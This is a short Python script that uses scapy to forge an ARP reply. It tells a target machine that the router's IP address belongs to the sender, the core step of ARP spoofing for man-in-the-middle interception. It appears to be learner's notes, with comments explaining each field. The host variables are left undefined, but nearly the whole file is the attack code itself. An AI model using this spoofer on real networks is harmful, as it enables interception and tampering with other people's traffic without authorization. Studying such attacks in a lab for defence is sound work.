#!/usr/bin/env python

import scapy.all as scapy

# Basic Idea of how it'll work:-
# i. creating a spoofer packet:
packet = scapy.ARP(op=2 , pdst=target_IP, hwdst=target_MAC, psrc=router_IP)
# op=2 as we are creating a ARP response not request pdst is your target
# and hwdst is your target's mac address 
# and psrc is source ip where it is coming from we gonna set that to the ip of router
# we can get ip and mac with the NetScanner programm 
# print(packet.show())
# print(packet.summary())  # to understand the result better

# ii. sending the spoofed packet:
scapy.send(packet)  # sending the packet to the target
